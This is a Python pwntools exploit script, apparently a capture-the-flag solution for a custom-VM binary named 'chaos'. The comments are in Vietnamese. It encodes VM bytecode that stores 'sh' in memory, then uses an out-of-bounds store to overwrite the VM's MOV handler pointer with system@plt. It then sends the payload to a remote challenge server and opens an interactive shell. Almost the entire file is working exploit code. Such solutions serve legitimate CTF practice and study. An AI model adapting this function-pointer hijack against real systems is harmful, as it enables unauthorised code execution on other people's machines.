from pwn import *

# Cấu hình
context.binary = binary = ELF('./chaos', checksec=False)
context.log_level = 'info'

# Địa chỉ quan trọng
VM_MEM_ADDR = 0x4040e0 
OFFSET_TO_MOV_PTR = -184

class ChaosVM:
    def __init__(self):
        self.key = 0x55
        self.regs = [0] * 8
        self.bytecode = b''

    def _encrypt(self, opcode, byte1, byte2):
        raw_opcode = 0
        while ((raw_opcode ^ self.key) % 7) != opcode:
            raw_opcode += 1
            if raw_opcode > 255: raise Exception("Opcode calc failed")
        return bytes([raw_opcode, byte1 ^ self.key, byte2 ^ self.key])

    def _update_key_loop(self):
        self.key = (self.key + 0x13) & 0xFF

    def mov(self, reg, val):
        self.bytecode += self._encrypt(1, reg, val)
        self.regs[reg] = val 
        self._update_key_loop()

    def add(self, dest, src):
        self.bytecode += self._encrypt(2, dest, src)
        res = (self.regs[dest] + self.regs[src]) & 0xFFFFFFFFFFFFFFFF
        self.regs[dest] = res
        self.key ^= (res & 0xFF) 
        self._update_key_loop() 

    def store(self, src_val_reg, dest_addr_reg):
        self.bytecode += self._encrypt(5, src_val_reg, dest_addr_reg)
        self.key = (self.key + 1) & 0xFF 
        self._update_key_loop()

    def set_reg_value_optimized(self, reg, target_val):
        target_val &= 0xFFFFFFFFFFFFFFFF
        
        # Chuyển sang hex string để xử lý từng byte
        hex_str = hex(target_val)[2:]
        if len(hex_str) % 2 != 0: hex_str = '0' + hex_str
        byte_list = bytes.fromhex(hex_str)
        
        if not byte_list:
            self.mov(reg, 0)
            return

        # Init byte đầu tiên
        self.mov(reg, byte_list[0])
        
        # Các byte sau
        for b in byte_list[1:]:
            # Shift 8 bit (x256) bằng cách cộng chính nó 8 lần
            # Đây là cách tốn ít byte nhất (3 bytes * 8 = 24 bytes)
            for _ in range(8):
                self.add(reg, reg)
            
            # Cộng giá trị byte mới
            if b != 0:
                self.mov(7, b) # R7 là temp
                self.add(reg, 7)

vm = ChaosVM()

# --- BƯỚC 1: Tạo chuỗi "sh" (Tối ưu hóa kích thước) ---
# "sh" = 0x6873 (Little Endian: 73 68 00 ...)
# Chỉ tốn ~30-40 bytes bytecode thay vì ~240 bytes cho "/bin/sh"
log.info("Generating 'sh' in R0...")
vm.set_reg_value_optimized(0, 0x6873) 

vm.set_reg_value_optimized(1, 0) # Index 0
log.info("Storing 'sh' to VM Memory[0]...")
vm.store(0, 1)

# --- BƯỚC 2: Chuẩn bị tham số R0 cho system() ---
# R0 = 0x4040e0 (Địa chỉ chuỗi "sh")
log.info(f"Generating address of buffer ({hex(VM_MEM_ADDR)}) in R0...")
vm.set_reg_value_optimized(0, VM_MEM_ADDR)

# --- BƯỚC 3: Ghi đè Function Ptr ---
# R3 = system@plt
system_plt = binary.plt['system']
log.info(f"Generating System PLT ({hex(system_plt)}) in R3...")
vm.set_reg_value_optimized(3, system_plt)

# R4 = Offset -184
# Số âm 64-bit tốn nhiều byte nhất, nhưng nhờ tiết kiệm ở bước 1 nên giờ sẽ đủ chỗ.
log.info(f"Generating Offset ({OFFSET_TO_MOV_PTR}) in R4...")
vm.set_reg_value_optimized(4, OFFSET_TO_MOV_PTR)

log.info("Overwriting MOV function pointer with system()...")
vm.store(3, 4)

# --- BƯỚC 4: Kích hoạt ---
log.info("Triggering shell via MOV R0...")
vm.mov(0, 0) 

# --- Gửi Exploit ---
# r = process('./chaos')
r = remote('chall.0xfun.org', 5847)

r.recvuntil(b"Hex encoded): ")
payload_hex = vm.bytecode.hex()
payload_len = len(payload_hex)//2
log.info(f"Payload length: {payload_len} bytes")

if payload_len > 512:
    log.critical(f"STILL TOO LARGE: {payload_len}/512 bytes")
else:
    log.success(f"Payload fits! ({payload_len}/512 bytes)")
    r.sendline(payload_hex.encode())
    r.interactive()